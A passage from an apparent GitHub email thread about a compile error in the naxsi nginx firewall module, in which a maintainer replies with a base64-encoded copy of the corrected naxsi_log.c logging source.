src/http/modules -I\nsrc/mail \\\n-o objs/addon/naxsi_src/naxsi_log.o \\\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c: In function\n'naxsi_http_log_handler':\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c:247:7: error: pointer\ntargets in passing argument 1 of 'ndebug' differ in signedness\n[-Werror=pointer-sign]\nndebug(str[i].data);\n^\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_log.c:40:6: note: expected 'const\nchar\n' but argument is of type 'u_char ' void ndebug(const char str) { ^ cc1:\nall warnings being treated as errors make[1]: [objs/addon/naxsi_src/naxsi_log.o] Error 1\nmake[1]: Leaving directory `/opt/nginx-1.5.12'\nmake: *** [build] Error 2\n\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-39228001\n.\n. Lol,\n\nnot in the function definition.\nTry to get this code, I put the \"cast\" on the proper place. Unfortunately I\ndon't use the same gcc options as you do, so I didn't catch the error you\ngot:\nLyoKICogTkFYU0ksIGEgd2ViIGFwcGxpY2F0aW9uIGZpcmV3YWxsIGZvciBOR0lOWAogKiBDb3B5\ncmlnaHQgKEMpIDIwMTEsIFRoaWJhdWx0ICdidWknIEtvZWNobGluCiAqICAKICogVGhpcyBwcm9n\ncmFtIGlzIGZyZWUgc29mdHdhcmU6IHlvdSBjYW4gcmVkaXN0cmlidXRlIGl0IGFuZC9vciBtb2Rp\nZnkKICogaXQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5z\nZSBhcyBwdWJsaXNoZWQgYnkKICogdGhlIEZyZWUgU29mdHdhcmUgRm91bmRhdGlvbiwgZWl0aGVy\nIHZlcnNpb24gMiBvZiB0aGUgTGljZW5zZSwgb3IKICogKGF0IHlvdXIgb3B0aW9uKSBhbnkgbGF0\nZXIgdmVyc2lvbi4KICogCiAqIEluIGFkZGl0aW9uLCBhcyBhIHNwZWNpYWwgZXhjZXB0aW9uLCB0\naGUgY29weXJpZ2h0IGhvbGRlcnMgZ2l2ZQogKiBwZXJtaXNzaW9uIHRvIGxpbmsgdGhlIGNvZGUg\nb2YgcG9ydGlvbnMgb2YgdGhpcyBwcm9ncmFtIHdpdGggdGhlCiAqIE9wZW5TU0wgbGlicmFyeSB1\nbmRlciBjZXJ0YWluIGNvbmRpdGlvbnMgYXMgZGVzY3JpYmVkIGluIGVhY2gKICogaW5kaXZpZHVh\nbCBzb3VyY2UgZmlsZSwgYW5kIGRpc3RyaWJ1dGUgbGlua2VkIGNvbWJpbmF0aW9ucwogKiBpbmNs\ndWRpbmcgdGhlIHR3by4KICogWW91IG11c3Qgb2JleSB0aGUgR05VIEdlbmVyYWwgUHVibGljIExp\nY2Vuc2UgaW4gYWxsIHJlc3BlY3RzCiAqIGZvciBhbGwgb2YgdGhlIGNvZGUgdXNlZCBvdGhlciB0\naGFuIE9wZW5TU0wuICBJZiB5b3UgbW9kaWZ5CiAqIGZpbGUocykgd2l0aCB0aGlzIGV4Y2VwdGlv\nbiwgeW91IG1heSBleHRlbmQgdGhpcyBleGNlcHRpb24gdG8geW91cgogKiB2ZXJzaW9uIG9mIHRo\nZSBmaWxlKHMpLCBidXQgeW91IGFyZSBub3Qgb2JsaWdhdGVkIHRvIGRvIHNvLiAgSWYgeW91CiAq\nIGRvIG5vdCB3aXNoIHRvIGRvIHNvLCBkZWxldGUgdGhpcyBleGNlcHRpb24gc3RhdGVtZW50IGZy\nb20geW91cgogKiB2ZXJzaW9uLiAgSWYgeW91IGRlbGV0ZSB0aGlzIGV4Y2VwdGlvbiBzdGF0ZW1l\nbnQgZnJvbSBhbGwgc291cmNlCiAqIGZpbGVzIGluIHRoZSBwcm9ncmFtLCB0aGVuIGFsc28gZGVs\nZXRlIGl0IGhlcmUuCiAqIAogKiBUaGlzIHByb2dyYW0gaXMgZGlzdHJpYnV0ZWQgaW4gdGhlIGhv\ncGUgdGhhdCBpdCB3aWxsIGJlIHVzZWZ1bCwKICogYnV0IFdJVEhPVVQgQU5ZIFdBUlJBTlRZOyB3\naXRob3V0IGV2ZW4gdGhlIGltcGxpZWQgd2FycmFudHkgb2YKICogTUVSQ0hBTlRBQklMSVRZIG9y\nIEZJVE5FU1MgRk9SIEEgUEFSVElDVUxBUiBQVVJQT1NFLiAgU2VlIHRoZQogKiBHTlUgR2VuZXJh\nbCBQdWJsaWMgTGljZW5zZSBmb3IgbW9yZSBkZXRhaWxzLgogKiAKICogWW91IHNob3VsZCBoYXZl\nIHJlY2VpdmVkIGEgY29weSBvZiB0aGUgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UKICogYWxv\nbmcgd2l0aCB0aGlzIHByb2dyYW0uICBJZiBub3QsIHNlZSA8aHR0cDovL3d3dy5nbnUub3JnL2xp\nY2Vuc2VzLz4uCiAqLwovKgoqKiBUaGlzIGZpbGVzIGNvbnRhaW5zIHNrZWxldG9uIGZ1bmN0aW9u\ncywgCioqIHN1Y2ggYXMgcmVnaXN0cmVkIGhhbmRsZXJzLiBSZWFkZXJzIGFscmVhZHkgCioqIGF3\nYXJlIG9mIG5naW54J3MgbW9kdWxlcyBjYW4gc2tpcCBtb3N0IG9mIHRoaXMuCiovCgojaW5jbHVk\nZSAibmF4c2kuaCIKCgp2b2lkIG5kZWJ1Zyhjb25zdCBjaGFyICpzdHIpIHsKICBGSUxFICpmPWZv\ncGVuKCIvdG1wL2RlYnVnIiwiYSsiKTsKICBmd3JpdGUoc3RyLDEsc3RybGVuKHN0ciksZik7CiAg\nZmNsb3NlKGYpOwp9CgoKLyoqCiAqIGNvbmZpZ3VyYXRpb24gZnVuY3Rpb24gZm9yIHRoZSAiTmF4\nc2lMb2dmaWxlIiBrZXl3b3JkIGluIHRoZSAKICogbmd4X2NvbW1hbmRfdCBtb2R1bGVzIChjaGVj\nayBuYXhzaV9za2VsZXRvbi5jKQogKiBmb3IgdGhlIE1BSU4KICovCmNoYXIgKgpuZ3hfaHR0cF9u\nYXhzaV9sb2dmaWxlX21haW5fY29uZihuZ3hfY29uZl90ICpjZiwgbmd4X2NvbW1hbmRfdCAqY21k\nLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2b2lkICpjb25mKQp7CiAgbmd4X2h0dHBf\nZHVtbXlfbWFpbl9jb25mX3QgICAgKmFsY2YgPSBjb25mOwogIG5neF9zdHJfdCAgICAgICAgICAg\nICAgICAgICAgICp2YWx1ZTsKICBuZ3hfbmF4c2lfbG9nX3QgICAgICAgICAgICAgICAqbG9nOwoK\nICBpZiAoIWFsY2YgfHwgIWNmKQogICAgcmV0dXJuIChOR1hfQ09ORl9FUlJPUik7ICAvKiBhbGxv\nYyBhIG5ldyBydWxlICovCgogIHZhbHVlID0gY2YtPmFyZ3MtPmVsdHM7CiAgLyogY3JlYXRlIHNw\nZWNpZmljIGxvZyBmaWxlICovCiAgaWYgKCAoIW5neF9zdHJjbXAodmFsdWVbMF0uZGF0YSwgVE9Q\nX05BWFNJX0xPR0ZJTEVfTikgfHwKICAgICAgICAhbmd4X3N0cmNtcCh2YWx1ZVswXS5kYXRhLCBU\nT1BfTkFYU0lfTE9HRklMRV9UKSkKICAgICAgICYmIHZhbHVlWzFdLmxlbikgewogICAgCiAgICBp\nZiAoYWxjZi0+bmF4c2lfbG9ncyA9PSBOVUxMKSB7CiAgICAgIGFsY2YtPm5heHNpX2xvZ3MgPSBu\nZ3hfYXJyYXlfY3JlYXRlKGNmLT5wb29sLCAyLCBzaXplb2Yobmd4X25heHNpX2xvZ190KSk7CiAg\nICAgIGlmIChhbGNmLT5uYXhzaV9sb2dzID09IE5VTEwpIHsKICAgICAgICByZXR1cm4gTkdYX0NP\nTkZfRVJST1I7CiAgICAgIH0KICAgIH0KCiAgbG9nID0gbmd4X2FycmF5X3B1c2goYWxjZi0+bmF4\nc2lfbG9ncyk7CiAgaWYgKGxvZyA9PSBOVUxMKSB7CiAgICByZXR1cm4gTkdYX0NPTkZfRVJST1I7\nCiAgfQogIG5neF9tZW16ZXJvKGxvZywgc2l6ZW9mKG5neF9uYXhzaV9sb2dfdCkpOwoKICBsb2ct\nPmZpbGUgPSBuZ3hfY29uZl9vcGVuX2ZpbGUoY2YtPmN5Y2xlLCAmdmFsdWVbMV0pOwogIGlmIChs\nb2ctPmZpbGUgPT0gTlVMTCkgewogICAgcmV0dXJuIE5HWF9DT05GX0VSUk9SOwogIH0KCiAgLy8g\nbG9nIGZvcm1hdAoKI2lmZGVmIG1lY2hhbmljc19kZWJ1ZwogLy8gbmd4X2NvbmZfbG9nX2Vycm9y\nKE5HWF9MT0dfRU1FUkcsIGNmLCAwLCAibmF4c2kgbG9nLiIpOwojZW5kaWYKICAgIHJldHVybiAo\nTkdYX0NPTkZfT0spOwogIH0KICBlbHNlCiAgICByZXR1cm4gTkdYX0NPTkZfRVJST1I7Cn0KCgoK\nLyoqCiAqIGNvbmZpZ3VyYXRpb24gZnVuY3Rpb24gZm9yIHRoZSAiTmF4c2lMb2dmaWxlIiBrZXl3\nb3JkIGluIHRoZSAKICogbmd4X2NvbW1hbmRfdCBtb2R1bGVzIChjaGVjayBuYXhzaV9za2VsZXRv\nbi5jKQogKiBmb3IgTE9DQVRJT04KICovCmNoYXIgKgpuZ3hfaHR0cF9uYXhzaV9sb2dmaWxlX2xv\nY19jb25mKG5neF9jb25mX3QgKmNmLCBuZ3hfY29tbWFuZF90ICpjbWQsCiAgICAgICAgICAgICAg\nICAgICAgICAgICAgIHZvaWQgKmNvbmYpCnsKICBuZ3hfaHR0cF9kdW1teV9sb2NfY29uZl90ICAg\nICAqYWxjZiA9IGNvbmY7CiAgbmd4X3N0cl90ICAgICAgICAgICAgICAgICAgICAgKnZhbHVlOwog\nIG5neF9uYXhzaV9sb2dfdCAgICAgICAgICAgICAgICpsb2c7CgogIGlmICghYWxjZiB8fCAhY2Yp\nCiAgICByZXR1cm4gKE5HWF9DT05GX0VSUk9SKTsKICB2YWx1ZSA9IGNmLT5hcmdzLT5lbHRzOwoK\nICAvKiBjcmVhdGUgc3BlY2lmaWMgbG9nIGZpbGUgKi8KICBpZiAoICghbmd4X3N0cmNtcCh2YWx1\nZVswXS5kYXRhLCBUT1BfTkFYU0lfTE9HRklMRV9OKSB8fAogICAgICAgICFuZ3hfc3RyY21wKHZh\nbHVlWzBdLmRhdGEsIFRPUF9OQVhTSV9MT0dGSUxFX1QpKQogICAgICAgJiYgdmFsdWVbMV0ubGVu\nKSB7CiAgICAKICAgIGlmIChhbGNmLT5uYXhzaV9sb2dzID09IE5VTEwpIHsKICAgICAgYWxjZi0+\nbmF4c2lfbG9ncyA9IG5neF9hcnJheV9jcmVhdGUoY2YtPnBvb2wsIDIsIHNpemVvZihuZ3hfbmF4\nc2lfbG9nX3QpKTsKICAgICAgaWYgKGFsY2YtPm5heHNpX2xvZ3MgPT0gTlVMTCkgewogICAgICAg\nIHJldHVybiBOR1hfQ09ORl9FUlJPUjsKICAgICAgfQogICAgfQoKICBsb2cgPSBuZ3hfYXJyYXlf\ncHVzaChhbGNmLT5uYXhzaV9sb2dzKTsKICBpZiAobG9nID09IE5VTEwpIHsKICAgIG5kZWJ1Zygi\nbmd4X2h0dHBfbmF4c2lfbG9nZmlsZV9sb2NfY29uZigpOiBub3QgYWJsZSB0byBvcGVuIGxvZyBm\naWxlXG4iKTsKICAgIHJldHVybiBOR1hfQ09ORl9FUlJPUjsKICB9CiAgbmd4X21lbXplcm8obG9n\nLCBzaXplb2Yobmd4X25heHNpX2xvZ190KSk7CgogIGxvZy0+ZmlsZSA9IG5neF9jb25mX29wZW5f\nZmlsZShjZi0+Y3ljbGUsICZ2YWx1ZVsxXSk7CiAgaWYgKGxvZy0+ZmlsZSA9PSBOVUxMKSB7CiAg\nICBuZGVidWcoIm5neF9odHRwX25heHNpX2xvZ2ZpbGVfbG9jX2NvbmYoKTogbm90IGFibGUgdG8g\nb3BlbiBsb2cgZmlsZS4gMlxuIik7CiAgICByZXR1cm4gTkdYX0NPTkZfRVJST1I7CiAgfQoKICAv\nLyBsb2cgZm9ybWF0CgojaWZkZWYgbWVjaGFuaWNzX2RlYnVnCiAvLyBuZ3hfY29uZl9sb2dfZXJy\nb3IoTkdYX0xPR19FTUVSRywgY2YsIDAsICJuYXhzaSBsb2cuIik7CiNlbmRpZgogICAgcmV0dXJu\nIChOR1hfQ09ORl9PSyk7CiAgfQogIGVsc2UKICAgIHJldHVybiBOR1hfQ09ORl9FUlJPUjsKfQoK\nCgovKioKICogbG93IGxldmVsIGZ1bmN0aW9uIHRvIHdyaXRlIGxvZy4gQ29kZSBoYXMgYmVlbiB0\nYWtlbiBmcm9tIAogKiBuZ2lueCBjb3JlL25neF9sb2cuYyAKICovCnN0YXRpYyB2b2lkCm5neF9u\nYXhzaV9sb2dfd3JpdGUobmd4X2h0dHBfcmVxdWVzdF90ICpyLCBuZ3hfbmF4c2lfbG9nX3QgKmxv\nZywgdV9jaGFyICpidWYsIHNpemVfdCBsZW4pCnsKICAgIHVfY2hhciAgICAgICAgICAgICAgKm5h\nbWU7CiAgICB0aW1lX3QgICAgICAgICAgICAgICBub3c7CiAgICBzc2l6ZV90ICAgICAgICAgICAg\nICBuOwogICAgbmd4X2Vycl90ICAgICAgICAgICAgZXJyOwoKICAgIG5hbWUgPSBsb2ctPmZpbGUt\nPm5hbWUuZGF0YTsKICAgIG4gPSBuZ3hfd3JpdGVfZmQobG9nLT5maWxlLT5mZCwgYnVmLCBsZW4p\nOwogICAgaWYgKG4gPT0gKHNzaXplX3QpIGxlbikgewoJbmRlYnVnKCJuZ3hfbmF4c2lfbG9nX3dy\naXRlKCk6IG9rXG4iKTsKICAgICAgICByZXR1cm47CiAgICB9CiAgICBuZGVidWcoIm5neF9uYXhz\naV9sb2dfd3JpdGUoKTogZmFpbFxuIik7CgogICAgbm93ID0gbmd4X3RpbWUoKTsKCiAgICBpZiAo\nbiA9PSAtMSkgewogICAgICAgIGVyciA9IG5neF9lcnJubzsKCiAgICAgICAgaWYgKGVyciA9PSBO\nR1hfRU5PU1BDKSB7CiAgICAgICAgICAgIGxvZy0+ZGlza19mdWxsX3RpbWUgPSBub3c7CiAgICAg\nICAgfQoKICAgICAgICBpZiAobm93IC0gbG9nLT5lcnJvcl9sb2dfdGltZSA+IDU5KSB7CiAgICAg\nICAgICAgIG5neF9sb2dfZXJyb3IoTkdYX0xPR19BTEVSVCwgci0+Y29ubmVjdGlvbi0+bG9nLCBl\ncnIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgbmd4X3dyaXRlX2ZkX24gIiB0byBcIiVzXCIg\nZmFpbGVkIiwgbmFtZSk7CgogICAgICAgICAgICBsb2ctPmVycm9yX2xvZ190aW1lID0gbm93Owog\nICAgICAgIH0KCiAgICAgICAgcmV0dXJuOwogICAgfQoKICAgIGlmIChub3cgLSBsb2ctPmVycm9y\nX2xvZ190aW1lID4gNTkpIHsKICAgICAgICBuZ3hfbG9nX2Vycm9yKE5HWF9MT0dfQUxFUlQsIHIt\nPmNvbm5lY3Rpb24tPmxvZywgMCwKICAgICAgICAgICAgICAgICAgICAgIG5neF93cml0ZV9mZF9u\nICIgdG8gXCIlc1wiIHdhcyBpbmNvbXBsZXRlOiAleiBvZiAldXoiLAogICAgICAgICAgICAgICAg\nICAgICAgbmFtZSwgbiwgbGVuKTsKCiAgICAgICAgbG9nLT5lcnJvcl9sb2dfdGltZSA9IG5vdzsK\nICAgIH0KfQoKCgovKioKICogV2hlbiBkZWFsaW5nIHdpdGggYSBodHRwIHJlcXVlc3QsIG5naW54\nIHByb2Nlc3MgaXQgdmlhIGRpZmZlcmVudCBwaGFzZXMKICogKHNlZSBodHRwOi8vd2lraS5uZ2lu\neC5vcmcvUGhhc2VzKS4gTG9nZ2luZyBpcyBvbmUgb2YgdGhlIGxhc3QgcGhhc2UuCiAqIHRoZSBu\nYXhzaV9odHRwX2xvZ19oYW5kbGVyIGlzIGNhbGxlZCB0byB0cmVhdCB0aGlzIHBoYXNlLgogKgog\nKiBXaGF0IG5heHNpX2h0dHBfbG9nX2hhbmRsZXIgZG9lczogaXQgY2hlY2sgaWYgdGhlIG5neF9o\ndHRwX2R1bW15X2xvY19jb25mX3QgaGFzCiAqIG9uZSBvciBzZXZlcmFsIGxvZyBzdHJpbmdzIHRv\nIG91dHB1dCAod2hpY2ggaGF2ZSBiZWVuIGZpbGVkIHZpYSBuZ3hfbG9nX25heHNpKCkpLAogKiBh\nbmQgd3JpdGUgdGhlbSB0byB0aGUgbmF4c2kgbG9nIGZpbGUKICovCm5neF9pbnRfdApuYXhzaV9o\ndHRwX2xvZ19oYW5kbGVyKG5neF9odHRwX3JlcXVlc3RfdCAqcikKewogIC8vbmd4X2h0dHBfcmVx\ndWVzdF9jdHhfdCAgICAgKmN0eDsKICBuZ3hfaHR0cF9kdW1teV9sb2NfY29uZl90ICAqY2Y7CiAg\nbmd4X25heHNpX2xvZ190ICAgICAgICAgICAgKmxvZzsKICBuZ3hfdWludF90ICAgICAgICAgICAg\nICAgICBpLGw7CiAgbmd4X3N0cl90ICAgICAgICAgICAgICAgICAgKnN0cjsKICBuZ3hfYXJyYXlf\ndCAgICAgICAgICAgICAgICAqbG9nYXJyYXk7CiAgbmd4X2h0dHBfZHVtbXlfbWFpbl9jb25mX3Qg\nKm1haW5fY2Y7CiAgCiAgbmRlYnVnKCJuYXhzaV9odHRwX2xvZ19oYW5kbGVyKClcbiIpOwogIGNm\nID0gbmd4X2h0dHBfZ2V0X21vZHVsZV9sb2NfY29uZihyLCBuZ3hfaHR0cF9uYXhzaV9tb2R1bGUp\nOwogIG1haW5fY2YgPSBuZ3hfaHR0cF9nZXRfbW9kdWxlX21haW5fY29uZihyLCBuZ3hfaHR0cF9u\nYXhzaV9tb2R1bGUpOwogIAogIGlmIChjZi0+bmF4c2lfbG9nc3RyaW5ncz09TlVMTCkKICAgIHJl\ndHVybiBOR1hfT0s7CiAgCiAgbmRlYnVnKCJuYXhzaV9odHRwX2xvZ19oYW5kbGVyKCkgMVxuIik7\nCiAgCiAgaWYgKGNmLT5uYXhzaV9sb2dzIT1OVUxMICYmIGNmLT5uYXhzaV9sb2dzLT5uZWx0cyA+\nIDApIHsKICAgIGxvZ2FycmF5PWNmLT5uYXhzaV9sb2dzOwogIH0gZWxzZSBpZiAobWFpbl9jZi0+\nbmF4c2lfbG9ncyE9TlVMTCAmJiBtYWluX2NmLT5uYXhzaV9sb2dzLT5uZWx0cyA+IDApIHsKICAg\nIGxvZ2FycmF5PW1haW5fY2YtPm5heHNpX2xvZ3M7CiAgfSBlbHNlIHsKLy8gICAgbmd4X2xvZ19l\ncnJvcihOR1hfTE9HX0VSUiwgci0+Y29ubmVjdGlvbi0+bG9nLCAwLCAiaW4gbmF4c2lfaHR0cF9s\nb2dfaGFuZGxlciBsb2cgYXJyYXkgaXMgTlVMTCIpOwogICAgcmV0dXJuIE5HWF9FUlJPUjsKICB9\nCiAgbmRlYnVnKCJuYXhzaV9odHRwX2xvZ19oYW5kbGVyKCkgMlxuIik7CiAgbG9nID0gbG9nYXJy\nYXktPmVsdHM7CiAgc3RyPWNmLT5uYXhzaV9sb2dzdHJpbmdzLT5lbHRzOwogIGZvciAoaT0wO2k8\nY2YtPm5heHNpX2xvZ3N0cmluZ3MtPm5lbHRzO2krKykgewogICAgZm9yIChsID0gMDsgbCA8IGxv\nZ2FycmF5LT5uZWx0czsgbCsrKSB7CiAgICAgIG5kZWJ1ZygoY29uc3QgY2hhciAqKXN0cltpXS5k\nYXRhKTsKICAgICAgbmRlYnVnKCJcbiIpOwogICAgICBpZiAoc3RyW2ldLmRhdGEhPU5VTEwpCiAg\nICAgICAgbmd4X25heHNpX2xvZ193cml0ZShyLCAmbG9nW2xdLCBzdHJbaV0uZGF0YSwgc3RyW2ld\nLmxlbik7CiAgICB9CiAgICBuZ3hfcGZyZWUoci0+cG9vbCwgc3RyW2ldLmRhdGEpOwogICAgc3Ry\nW2ldLmRhdGE9TlVMTDsKICAgIHN0cltpXS5sZW49MDsKICB9CiAgbmd4X2FycmF5X2Rlc3Ryb3ko\nY2YtPm5heHNpX2xvZ3N0cmluZ3MpOwogIC8vY2YtPm5heHNpX2xvZ3N0cmluZ3MtPm5lbHRzPTA7\nCiAgY2YtPm5heHNpX2xvZ3N0cmluZ3M9TlVMTDsKCiAgcmV0dXJuIE5HWF9PSzsKfQoKCgpzdGF0\naWMgbmd4X3N0cl90IGVycl9sZXZlbHNbXSA9IHsKICAgIG5neF9udWxsX3N0cmluZywKICAgIG5n\neF9zdHJpbmcoImVtZXJnIiksCiAgICBuZ3hfc3RyaW5nKCJhbGVydCIpLAogICAgbmd4X3N0cmlu\nZygiY3JpdCIpLAogICAgbmd4X3N0cmluZygiZXJyb3IiKSwKICAgIG5neF9zdHJpbmcoIndhcm4i\nKSwKICAgIG5neF9zdHJpbmcoIm5vdGljZSIpLAogICAgbmd4X3N0cmluZygiaW5mbyIpLAogICAg\nbmd4X3N0cmluZygiZGVidWciKQp9OwoKCgovKioKICogdGhlIHJlc3Qgb2YgbmF4c2kgc2hvdWxk\nIGNhbGwgdGhpcyBmdW5jdGlvbiAod2hpY2ggaXMgY29tcGF0aWJsZSB3aXRoIAogKiBjbGFzc2lj\nYWwgbmdpbnggbG9nIGVycm9yIGZ1bmN0aW9uKS4KICogVGhpcyBmdW5jdGlvbiB3aWxsIGNoZWNr\nIGlmIGEgbmF4c2lfbG9nIGhhcyBiZWVuIGRlZmluZWQ6CiAqIC0gaWYgbm90LCBpdCB3aWxsIHJl\nZGlyZWN0IGxvZ3MgdG8gbmdpbnggbG9nIGVycm9yCiAqIC0gaWYgaXQgZXhpc3QsIGl0IHdpbGwg\nYXBwZW5kIHRoZSBsb2cgdG8gdGhlIGxvYy0+bmF4c2lfbG9nc3RyaW5ncywgdG8KICogICBiZSBv\ndXRwdXQgYXQgdGhlIGVuZCBvZiB0aGUgY3VycmVudCByZXF1ZXN0IChzZWUgbmF4c2lfaHR0cF9s\nb2dfaGFuZGxlcigpKQogKi8KI2lmIChOR1hfSEFWRV9WQVJJQURJQ19NQUNST1MpCnZvaWQKbmd4\nX2xvZ19uYXhzaShuZ3hfdWludF90IGxldmVsLCBuZ3hfaHR0cF9yZXF1ZXN0X3QgKnIsIG5neF9l\ncnJfdCBlcnIsCiAgICBjb25zdCBjaGFyICpmbXQsIC4uLikKI2Vsc2UKdm9pZApuZ3hfbG9nX25h\neHNpKG5neF91aW50X3QgbGV2ZWwsIG5neF9odHRwX3JlcXVlc3RfdCAqciwgbmd4X2Vycl90IGVy\nciwKICAgIGNvbnN0IGNoYXIgKmZtdCwgdmFfbGlzdCBhcmdzKQojZW5kaWYKewojaWYgKE5HWF9I\nQVZFX1ZBUklBRElDX01BQ1JPUykKICAgIHZhX2xpc3QgIGFyZ3M7CiNlbmRpZgogICAgbmd4X2h0\ndHBfZHVtbXlfbG9jX2NvbmZfdCAqbG9jOwogICAgbmd4X2h0dHBfZHVtbXlfbWFpbl9jb25mX3Qg\nKm1haW5fY2Y7CiAgICB1X2NoYXIgICpwLCAqbGFzdDsKICAgIHVfY2hhciAgIGVycnN0cltOR1hf\nTUFYX0VSUk9SX1NUUl07CiAgICBuZ3hfc3RyX3QgKmxvZ21zZzsKCgogICAgbmRlYnVnKCJuZ3hf\nbG9nX25heHNpKClcbiIpOwogICAgbGFzdCA9IGVycnN0ciArIE5HWF9NQVhfRVJST1JfU1RSOwoK\nICAgIGxvYyA9IG5neF9odHRwX2dldF9tb2R1bGVfbG9jX2NvbmYociwgbmd4X2h0dHBfbmF4c2lf\nbW9kdWxlKTsKICAgIG1haW5fY2YgPSBuZ3hfaHR0cF9nZXRfbW9kdWxlX21haW5fY29uZihyLCBu\nZ3hfaHR0cF9uYXhzaV9tb2R1bGUpOwoKICAgIGlmIChsb2MgID09IE5VTEwgfHwgciA9PSBOVUxM\nIHx8IG1haW5fY2Y9PU5VTEwpIHsKICAgICAgICByZXR1cm47CiAgICB9CiAgICAKICAgIGlmICgo\nbG9jLT5uYXhzaV9sb2dzPT1OVUxMIHx8IGxvYy0+bmF4c2lfbG9ncy0+bmVsdHMgPT0gMCkgJiYg\nKG1haW5fY2YtPm5heHNpX2xvZ3M9PU5VTEwgfHwgbWFpbl9jZi0+bmF4c2lfbG9ncy0+bmVsdHMg\nPT0gMCApKSB7CgojaWYgKE5HWF9IQVZFX1ZBUklBRElDX01BQ1JPUykKICAgICAgdmFfc3RhcnQo\nYXJncywgZm10KTsKICAgICAgcCA9IG5neF92c2xwcmludGYoZXJyc3RyLCBsYXN0LCBmbXQsIGFy\nZ3MpOwogICAgICAqcD0nXDAnOwogICAgICBuZ3hfbG9nX2Vycm9yKE5HWF9MT0dfRVJSLCByLT5j\nb25uZWN0aW9uLT5sb2csIDAsIChjb25zdCBjaGFyICopZXJyc3RyKTsgCiAgICAgIHZhX2VuZChh\ncmdzKTsKI2Vsc2UKICAgICAgbmd4X2xvZ19lcnJvcihOR1hfTE9HX0VSUiwgci0+Y29ubmVjdGlv\nbi0+bG9nLCAwLCBmbXQsIGFyZ3MpOyAKI2VuZGlmCiAgICAgIHJldHVybjsKICAgIH0KCgogICAg\nbmd4X21lbWNweShlcnJzdHIsIG5neF9jYWNoZWRfZXJyX2xvZ190aW1lLmRhdGEsCiAgICAgICAg\nICAgICAgIG5neF9jYWNoZWRfZXJyX2xvZ190aW1lLmxlbik7CgogICAgcCA9IGVycnN0ciArIG5n\neF9jYWNoZWRfZXJyX2xvZ190aW1lLmxlbjsKCiAgICBwID0gbmd4X3NscHJpbnRmKHAsIGxhc3Qs\nICIgWyVWXSAiLCAmZXJyX2xldmVsc1tsZXZlbF0pOwoKICAgIC8qIHBpZCN0aWQgKi8KICAgIHAg\nPSBuZ3hfc2xwcmludGYocCwgbGFzdCwgIiVQIyIgTkdYX1RJRF9UX0ZNVCAiOiAiLAogICAgICAg\nICAgICAgICAgICAgIG5neF9sb2dfcGlkLCBuZ3hfbG9nX3RpZCk7CgogICAgaWYgKHItPmNvbm5l\nY3Rpb24pIHsKLy8gICAgICBpZiAoci0+Y29ubmVjdGlvbi0+bG9nKSB7Ci8vICAgICAgICBwID0g\nbmd4X3NscHJpbnRmKHAsIGxhc3QsICIqJXVBICIsIHItPmNvbm5lY3Rpb24tPmxvZy0+Y29ubmVj\ndGlvbik7Ci8vICAgICAgfQogICAgICBwID0gbmd4X3NscHJpbnRmKHAsIGxhc3QsICIqJXVBICIs\nIHItPmNvbm5lY3Rpb24tPm51bWJlcik7CiAgICB9CiNpZiAoTkdYX0hBVkVfVkFSSUFESUNfTUFD\nUk9TKQoKICAgIHZhX3N0YXJ0KGFyZ3MsIGZtdCk7CiAgICBwID0gbmd4X3ZzbHByaW50ZihwLCBs\nYXN0LCBmbXQsIGFyZ3MpOwogICAgdmFfZW5kKGFyZ3MpOwoKI2Vsc2UKCiAgICBwID0gbmd4X3Zz\nbHByaW50ZihwLCBsYXN0LCBmbXQsIGFyZ3MpOwoKI2VuZGlmCgogICAgaWYgKGVycikgewogICAg\nICAgIHAgPSBuZ3hfbG9nX2Vycm5vKHAsIGxhc3QsIGVycik7CiAgICB9CgogICAgaWYgKGxldmVs\nICE9IE5HWF9MT0dfREVCVUcgJiYgci0+Y29ubmVjdGlvbikgewogICAgICBpZiAoci0+Y29ubmVj\ndGlvbi0+bG9nKSB7CiAgICAgICAgaWYgKHItPmNvbm5lY3Rpb24tPmxvZy0+aGFuZGxlcikgewog\nICAgICAgICAgcCA9IHItPmNvbm5lY3Rpb24tPmxvZy0+aGFuZGxlcihyLT5jb25uZWN0aW9uLT5s\nb2csIHAsIGxhc3QgLSBwKTsKICAgICAgICB9CiAgICAgIH0KICAgIH0KCiAgICBpZiAocCA+IGxh\nc3QgLSBOR1hfTElORUZFRURfU0laRSAtMSkgewogICAgICAgIHAgPSBsYXN0IC0gTkdYX0xJTkVG\nRUVEX1NJWkUgLTE7CiAgICB9CgogICAgbmd4X2xpbmVmZWVkKHApOwogICAgKihwKyspPSdcMCc7\nCgogICAgLyogYWRkIG5ldyBsaW5lIHRvIGxvZyBhZmVyICovCiAgICBpZiAobG9jLT5uYXhzaV9s\nb2dzdHJpbmdzPT1OVUxMKQogICAgICBsb2MtPm5heHNpX2xvZ3N0cmluZ3MgPSBuZ3hfYXJyYXlf\nY3JlYXRlKHItPnBvb2wsIDEsIHNpemVvZihuZ3hfc3RyX3QpKTsKICAgIAogICAgaWYgKGxvYy0+\nbmF4c2lfbG9nc3RyaW5ncz09TlVMTCkgewogICAgICBuZGVidWcoIm5heHNpX2xvZ3N0cmluZ3Mg\nc3RpbGwgTlVMTFxuIik7CiAgICAgIHJldHVybjsKICAgIH0KICAgIAogICAgbG9nbXNnPW5neF9h\ncnJheV9wdXNoKGxvYy0+bmF4c2lfbG9nc3RyaW5ncyk7CiAgICBpZiAobG9nbXNnIT1OVUxMKSB7\nCiAgICAgIGxvZ21zZy0+bGVuPXN0cmxlbigoY29uc3QgY2hhciAqKWVycnN0cik7CiAgICAgIGxv\nZ21zZy0+ZGF0YT1uZ3hfcGNhbGxvYyhyLT5wb29sLCBsb2dtc2ctPmxlbisxKTsKICAgICAgaWYg\nKGxvZ21zZy0+ZGF0YSE9TlVMTCkgewogICAgICAgIHA9bmd4X2NvcHkobG9nbXNnLT5kYXRhLGVy\ncnN0cixsb2dtc2ctPmxlbisxKTsKICAgICAgfSBlbHNlIHsKICAgICAgICBsb2dtc2ctPmxlbj0w\nOwogICAgICB9CiAgICB9Cn0K\nOn Tue, Apr 1, 2014 at 2:11 